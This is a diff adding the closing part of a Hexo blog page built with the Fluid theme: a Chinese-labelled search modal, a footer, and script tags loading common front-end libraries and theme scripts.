+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
